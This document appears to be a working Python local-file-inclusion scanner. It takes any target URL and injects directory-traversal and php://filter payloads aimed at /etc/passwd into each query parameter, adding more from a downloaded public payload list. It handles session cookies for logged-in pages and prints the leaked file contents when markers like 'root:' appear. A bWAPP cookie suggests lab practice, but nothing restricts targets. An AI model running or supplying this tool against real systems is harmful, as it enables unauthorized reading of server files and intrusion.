#!/usr/bin/env python3
import requests
from urllib.parse import urlparse, parse_qs, urlencode
import time
import sys

class Colors:
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    WARNING = '\033[93m'
    OKCYAN = '\033[96m'
    HEADER = '\033[95m'
    DIM = '\033[2m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

class SmartLFIScanner:
    def __init__(self, url, delay=0.2):
        self.url = url
        self.session = requests.Session()
        self.delay = delay
        self.findings = []
        self.authenticated = False
        
        # All payloads - core + GitHub
        self.payloads = []
        self.load_all_payloads()

    def load_all_payloads(self):
        """Load payloads"""
        core = [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            "/etc/passwd",
            "....//....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
        ]
        self.payloads = core
        
        # Try load external
        try:
            r = requests.get(
                "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Directory%20Traversal/Intruder/directory_traversal.txt",
                timeout=10
            )
            if r.status_code == 200:
                lines = [l.strip() for l in r.text.splitlines() if l.strip() and not l.startswith('#')]
                self.payloads.extend(lines)
                print(f"{Colors.OKGREEN}[+] Loaded {len(lines)} external payloads{Colors.ENDC}")
        except:
            pass
        
        # Remove duplicates
        self.payloads = list(dict.fromkeys(self.payloads))
        print(f"{Colors.OKCYAN}[*] Total payloads: {len(self.payloads)}{Colors.ENDC}")

    def send(self, url, data=None):
        """Send request - auto handles login"""
        try:
            time.sleep(self.delay)
            if data:
                r = self.session.post(url, data=data, timeout=10, verify=False)
            else:
                r = self.session.get(url, timeout=10, verify=False)
            return r
        except Exception as e:
            return None

    def is_login_page(self, text):
        """Detect if response is a login page"""
        if not text:
            return False
        
        text_lower = text.lower()[:2000]
        
        login_indicators = [
            "login", "password", "username", "sign in", "signin",
            "authentication", "session expired", "please log in",
            "invalid credentials", "access denied", "unauthorized"
        ]
        
        # Count matches
        matches = sum(1 for ind in login_indicators if ind in text_lower)
        return matches >= 2  # If 2+ indicators, likely login page

    def handle_auth(self, url):
        """Prompt for cookies if login detected"""
        print(f"\n{Colors.WARNING}{'='*70}{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] LOGIN REQUIRED{Colors.ENDC}")
        print(f"{Colors.WARNING}{'='*70}{Colors.ENDC}")
        print(f"The target requires authentication.")
        print(f"\n{Colors.OKCYAN}To fix:{Colors.ENDC}")
        print(f"  1. Open this URL in your browser: {url}")
        print(f"  2. Login with your credentials")
        print(f"  3. Press F12 → Application → Cookies → {urlparse(url).netloc}")
        print(f"  4. Copy the PHPSESSID (or session) value")
        print(f"\n{Colors.DIM}(Leave blank and press Enter to skip/cancel){Colors.ENDC}")
        
        phpsessid = input(f"\n{Colors.BOLD}Paste PHPSESSID value: {Colors.ENDC}").strip()
        
        if not phpsessid:
            print(f"{Colors.FAIL}[!] No cookie provided. Exiting.{Colors.ENDC}")
            sys.exit(1)
        
        # Set cookie
        domain = urlparse(url).netloc
        self.session.cookies.set('PHPSESSID', phpsessid, domain=domain)
        
        # Also try common security level cookie for bWAPP
        self.session.cookies.set('security_level', '0', domain=domain)
        
        print(f"{Colors.OKGREEN}[+] Cookie set. Retrying...{Colors.ENDC}")
        self.authenticated = True
        
        # Test the cookie
        r = self.send(url)
        if r and not self.is_login_page(r.text):
            print(f"{Colors.OKGREEN}[+] Authentication successful!{Colors.ENDC}")
            return r
        else:
            print(f"{Colors.WARNING}[!] Still showing login page. Trying additional cookies...{Colors.ENDC}")
            # Try to get more cookies
            self.prompt_additional_cookies(domain)
            return self.send(url)

    def prompt_additional_cookies(self, domain):
        """Prompt for additional cookies if needed"""
        print(f"\n{Colors.OKCYAN}Enter additional cookies (name=value format, empty line to finish):{Colors.ENDC}")
        
        while True:
            cookie_input = input(f"  Cookie (name=value): ").strip()
            if not cookie_input:
                break
            
            if '=' in cookie_input:
                name, value = cookie_input.split('=', 1)
                self.session.cookies.set(name.strip(), value.strip(), domain=domain)
                print(f"    {Colors.DIM}Added: {name.strip()}{Colors.ENDC}")
        
        print(f"{Colors.OKGREEN}[+] Additional cookies set{Colors.ENDC}")

    def smart_request(self, url, data=None):
        """Make request - handle auth automatically"""
        r = self.send(url, data)
        
        if r is None:
            return None
        
        # Check if login required
        if not self.authenticated and self.is_login_page(r.text):
            r = self.handle_auth(url)
        
        return r

    def is_vulnerable(self, base_text, base_len, attack_text, attack_len):
        """Detect if response indicates LFI"""
        if not attack_text or attack_len == 0:
            return False
            
        if attack_text == base_text:
            return False
        
        # Skip if still login page
        if self.is_login_page(attack_text):
            return False
        
        # Check for file content markers
        markers = ["root:", "daemon:", ":x:", "[boot loader]", "[fonts]", "HTTP_", "USER="]
        for m in markers:
            if m in attack_text:
                return True
        
        # Or significant size increase
        if attack_len > base_len + 200:
            return True
            
        return False

    def print_buffer(self, url, current, total):
        max_len = 100
        display = url if len(url) <= max_len else url[:97] + "..."
        sys.stdout.write(f"\r\033[K[{current}/{total}] {display}")
        sys.stdout.flush()

    def report(self, param, payload, data, url):
        print(f"\n\n{Colors.OKGREEN}{Colors.BOLD}{'='*70}{Colors.ENDC}")
        print(f"{Colors.OKGREEN}{Colors.BOLD}[!] VULNERABILITY FOUND!{Colors.ENDC}")
        print(f"{Colors.OKGREEN}{Colors.BOLD}{'='*70}{Colors.ENDC}")
        print(f"    Parameter: {Colors.BOLD}{param}{Colors.ENDC}")
        print(f"    Payload: {Colors.OKCYAN}{payload}{Colors.ENDC}")
        print(f"    URL: {url}")
        print(f"    Response Length: {len(data)} bytes")
        print(f"\n[!] RESPONSE DATA:")
        print(f"{Colors.DIM}{'-'*70}{Colors.ENDC}")
        
        lines = data.split('\n')
        for line in lines[:50]:
            if len(line) > 120:
                line = line[:117] + "..."
            print(line)
        
        if len(lines) > 50:
            print(f"\n... {len(lines) - 50} more lines ...")
            
        print(f"{Colors.DIM}{'-'*70}{Colors.ENDC}")

    def run(self):
        print(f"{Colors.HEADER}{'='*70}{Colors.ENDC}")
        print(f"{Colors.HEADER}{' LFI Scanner - Auto Auth Detection ':*^70}{Colors.ENDC}")
        print(f"{Colors.HEADER}{'='*70}{Colors.ENDC}")
        
        parsed = urlparse(self.url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)
        
        if not params:
            print(f"{Colors.FAIL}[!] No parameters found in URL!{Colors.ENDC}")
            return
        
        print(f"Target: {self.url}")
        print(f"Parameters: {Colors.OKCYAN}{list(params.keys())}{Colors.ENDC}")
        
        # Test first request to check auth
        print(f"\n{Colors.DIM}[*] Testing connection...{Colors.ENDC}")
        test_r = self.smart_request(self.url)
        if test_r is None:
            print(f"{Colors.FAIL}[!] Connection failed{Colors.ENDC}")
            return
        
        if self.authenticated:
            print(f"{Colors.OKGREEN}[*] Using authenticated session{Colors.ENDC}")
        
        # Test each parameter
        for param_name in params:
            print(f"\n{Colors.HEADER}[*] Testing parameter: {Colors.BOLD}{param_name}{Colors.ENDC}{Colors.ENDC}")
            
            # Baseline
            baseline_params = params.copy()
            baseline_params[param_name] = ["test123"]
            baseline_url = base + "?" + urlencode(baseline_params, doseq=True, safe='/')
            
            base_r = self.smart_request(baseline_url)
            if base_r is None:
                continue
            
            base_text = base_r.text
            base_len = len(base_text)
            print(f"    Baseline: {base_len} bytes")
            
            if self.is_login_page(base_text):
                print(f"    {Colors.WARNING}Still getting login page - check cookies{Colors.ENDC}")
                continue
            
            # Test all payloads
            total = len(self.payloads)
            print(f"    Testing {total} payloads...")
            
            found = False
            for i, payload in enumerate(self.payloads, 1):
                test_params = params.copy()
                test_params[param_name] = [payload]
                full_url = base + "?" + urlencode(test_params, doseq=True, safe='/')
                
                self.print_buffer(full_url, i, total)
                
                r = self.smart_request(full_url)
                if r is None:
                    continue
                
                if self.is_vulnerable(base_text, base_len, r.text, len(r.text)):
                    self.print_buffer("", 0, 0)
                    self.report(param_name, payload, r.text, full_url)
                    found = True
                    break
            
            print()
            if found:
                return
        
        print(f"\n{Colors.FAIL}[!] No vulnerabilities found.{Colors.ENDC}")


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    
    url = input("Target URL: ").strip()
    if not url.startswith('http'):
        url = 'http://' + url
    
    SmartLFIScanner(url).run()